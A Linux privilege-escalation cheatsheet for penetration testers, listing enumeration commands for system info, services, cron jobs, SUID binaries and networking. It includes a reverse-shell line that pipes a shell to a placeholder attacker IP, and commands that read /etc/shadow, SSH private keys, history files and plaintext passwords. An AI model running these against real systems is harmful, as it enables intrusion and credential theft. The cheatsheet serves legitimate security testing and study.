Linux Privilege Escalation Cheatsheet
Quick Wins
OS/Kernel Exploits
Search via Google or searchsploit for the OS (e.g., Ubuntu 14.04) or Kernel version (e.g., Linux Kernel 3.2.0).
Example search:

"Linux Kernel Privilege Escalation"

Sudo Rights

bash
Copy
Edit
sudo -l
Check sudo rights and look for vulnerable versions (also check if pkexec is available).

Cron Jobs

Enumerate jobs for all users.

Look for:

Writable scripts

Writable paths

Use of exploitable commands

Weak File Permissions

Writable system files (/etc/passwd, /etc/shadow, etc.)

SUID/SGID binaries

Files executed by root that are writable

SUID/SGID Binaries

Check for missing shared objects.

Search strings inside binaries.

Check shell versions for absolute function overwriting (bash, dash).

Information Gathering
Automation Tools
linuxprivchecker.py

upc.sh (unix-privesc-check)

LinEnum.sh

linux-exploit-suggester.sh

uptux

RootHelper

Operating System
OS Type and Version

bash
Copy
Edit
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release
cat /etc/redhat-release
Kernel Version and Architecture

bash
Copy
Edit
cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
Environmental Variables

bash
Copy
Edit
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
Printer Check

bash
Copy
Edit
lpstat -a
Applications & Services
Running Services

bash
Copy
Edit
ps aux
ps -ef
top
cat /etc/services
Services Running as Root

bash
Copy
Edit
ps aux | grep root
ps -ef | grep root
Installed Applications

bash
Copy
Edit
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archives
ls -alh /var/cache/yum/
Misconfigured Services

bash
Copy
Edit
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
Scheduled Jobs

bash
Copy
Edit
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
Plaintext Credentials

bash
Copy
Edit
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
Communications & Networking
NICs & Network Interfaces

bash
Copy
Edit
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network
Network Configuration

bash
Copy
Edit
cat /etc/resolv.conf
iptables -L
hostname
dnsdomainname
Network Activity

bash
Copy
Edit
lsof -i
netstat -antup
netstat -tulpn
ARP and Routing

bash
Copy
Edit
arp -e
route
/sbin/route -nee
Packet Sniffing

bash
Copy
Edit
tcpdump tcp dst [ip] [port]
Shells and Reverse Shells

bash
Copy
Edit
nc -lvp 4444
telnet [attacker-ip] 4444 | /bin/sh | [local-ip] 4445
Port Forwarding

bash
Copy
Edit
ssh -L 8080:127.0.0.1:80 root@192.168.1.7
ssh -R 8080:127.0.0.1:80 root@192.168.1.7
Confidential Information & Users
User Enumeration

bash
Copy
Edit
id
who
last
cat /etc/passwd | cut -d: -f1
Sensitive Files

bash
Copy
Edit
cat /etc/passwd
cat /etc/shadow
ls -alh /var/mail/
Home Directories

bash
Copy
Edit
ls -ahlR /root/
ls -ahlR /home/
History Files

bash
Copy
Edit
cat ~/.bash_history
cat ~/.nano_history
cat ~/.mysql_history
SSH Keys

bash
Copy
Edit
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys
cat /etc/ssh/ssh_host_rsa_key
File Systems
Writable Configs in /etc/

bash
Copy
Edit
ls -aRl /etc/ | awk '$1 ~ /^.*w.*/'
/var/ Directory Content

bash
Copy
Edit
ls -alh /var/log
ls -alh /var/mail
Website Directories

bash
Copy
Edit
ls -alhR /var/www/
Log Files

bash
Copy
Edit
cat /var/log/auth.log
cat /var/log/syslog
cat /var/log/apache2/access.log
Jail Escape

bash
Copy
Edit
python -c 'import pty;pty.spawn("/bin/bash")'
/bin/sh -i
Mounted File Systems

bash
Copy
Edit
mount
df -h
fstab and Unmounted FS

bash
Copy
Edit
cat /etc/fstab
Sticky Bits, SUID & SGID

bash
Copy
Edit
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
Preparation & Finding Exploits
Installed Languages

bash
Copy
Edit
find / -name perl*
find / -name python*
find / -name gcc*
Upload Methods

bash
Copy
Edit
find / -name wget
find / -name nc*
find / -name ftp
Finding Exploits

exploit-db.com

1337day.com

securityfocus.com

seclists.org

metasploit.com

CVE Info

cvedetails.com

packetstormsecurity.org

cve.mitre.org

📌 Notes
Always record findings even if no immediate exploit is found.

Prioritize misconfigurations first, then escalate using kernel/OS exploits.

Manual checks often find what automation misses!
